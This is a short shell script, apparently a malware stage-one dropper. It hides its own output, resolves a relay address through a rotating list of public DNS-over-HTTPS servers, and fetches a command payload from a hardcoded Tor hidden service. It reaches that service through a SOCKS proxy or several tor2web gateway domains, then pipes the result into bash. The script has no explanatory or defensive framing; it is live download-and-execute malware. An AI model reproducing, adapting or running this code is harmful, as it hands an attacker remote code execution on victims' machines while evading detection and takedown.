exec &>/dev/null
export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
c=$(echo "curl -4fsSLkA- -m200")
t=$(echo "i62hmnztfpzwrhjg34m6ruxem5oe36nulzmxcgbdbkiaceubprkta7ad")

sockz() {
n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)
p=$(echo "dns-query?name=relay.tor2socks.in")
s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)
}

u() {
sockz
f=/cmd
$c -x socks5h://$s:9050 $t.onion$f || $c $1$f
}
(
u $t.tor2web.in ||
u $t.tor2web.in ||
u $t.tor2web.to ||
u $t.onion.com.de ||
u $t.onion.sh ||
u $t.tor2web.io
)|bash